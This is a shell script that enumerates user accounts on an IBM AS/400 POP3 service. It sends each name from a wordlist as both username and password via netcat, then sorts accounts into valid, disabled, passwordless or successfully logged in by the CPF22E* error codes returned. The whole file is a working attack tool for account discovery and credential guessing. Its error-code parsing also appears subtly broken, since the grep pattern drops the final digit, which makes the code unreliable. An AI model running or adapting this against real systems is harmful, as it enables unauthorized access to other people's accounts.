#!/bin/sh

ShowUsage() {
	echo "$0 <host> <username file>"
	echo ""
	echo "Attempts to enumerate users through the POP3"
	echo "service on an AS/400"
}

EXPECTEDARGS=2

if [ $# -lt $EXPECTEDARGS ]; then
	ShowUsage
	exit 1
fi

# test for netcat....
nc -h 2> /dev/null 1> /dev/null
if [ $? -eq 127 ]; then
   	echo "ERROR: Unable to locate netcat (nc)."

	exit 1
fi

HOST=$1
USERFILE=$2

if [ ! -e $USERFILE ]; then
	echo "ERROR: Unable to find file $USERFILE."
	exit 2
fi

SCANRESULTS=`echo "$HOST.pop3_scan.txt"`
TMPFILE="pop3_scan.tmp"

VALIDUSERS=0
DISABLEDUSERS=0
SUCCESSFULLOGONS=0

USERLIST=`cat $USERFILE | grep -v "^#" | grep -v "^$"`

NUMUSERS=`echo "$USERLIST" | wc -l`

DATESTR=`date`
echo "[$DATESTR] Starting scan of $HOST..."
echo "[$DATESTR] Starting scan of $HOST using $USERFILE..." > $SCANRESULTS

for CURUSER in $USERLIST
do
	echo "Trying $CURUSER..."
	echo "user $CURUSER" > $TMPFILE
	echo "pass $CURUSER" >> $TMPFILE
	echo "quit" >> $TMPFILE

	TMPRESULT=`cat $TMPFILE | nc -i 1 -w 1 $HOST 110`

# Error codes
# CPF22E2 Valid user profile but password unknown
# CPF22E4 Valid user but they can't log in at the moment
# CPF22E3 login succeeded
# CPF22E5 No password for user profile

	ERRCODE=`echo "$TMPRESULT" | grep -Eo "CPF22E?"`

	case $ERRCODE in
	CPF22E2)
		echo "FOUND: $CURUSER valid"
		echo "$CURUSER:valid" >> $SCANRESULTS
		VALIDUSERS=$(( VALIDUSERS + 1 ))	
	;;
	CPF22E4)
		echo "FOUND:$CURUSER disabled"
		echo "$CURUSER:disabled" >> $SCANRESULTS
		VALIDUSERS=$(( VALIDUSERS + 1 ))	
		DISABLEDUSERS=$(( DISABLEDUSERS + 1 ))
	;;
	CPF22E3)
		echo "FOUND: $CURUSER Password $CURUSER"
		echo "$CURUSER:SUCCESS - Password $CURUSER" >> $SCANRESULTS
		VALIDUSERS=$(( VALIDUSERS + 1 ))	
		SUCCESSFULLOGONS=$(( SUCCESSFULLOGONS + 1 ))
	;;
	CPF22E5)
		echo "FOUND: No Password for $CURUSER"
		echo "$CURUSER:No password for user" >> $SCANRESULTS
		VALIDUSERS=$(( VALIDUSERS + 1 ))	
	;;
	esac
done

# Temp file will get cleared with each new loop from > redirection
# at the end just delete the file.
rm $TMPFILE

DATESTR=`date`
echo "[$DATESTR] Scan completed."
echo "[$DATESTR] Scan completed." >> $SCANRESULTS
echo ""
echo "" >> $SCANRESULTS
echo "Statistics:"
echo "Statistics:" >> $SCANRESULTS

echo "Valid Users: $VALIDUSERS"
echo "Valid Users: $VALIDUSERS" >> $SCANRESULTS

echo "Disabled Accounts: $DISABLEDUSERS"
echo "Disabled Accounts: $DISABLEDUSERS" >> $SCANRESULTS

echo "Successful logons: $SUCCESSFULLOGONS"
echo "Successful logons: $SUCCESSFULLOGONS" >> $SCANRESULTS

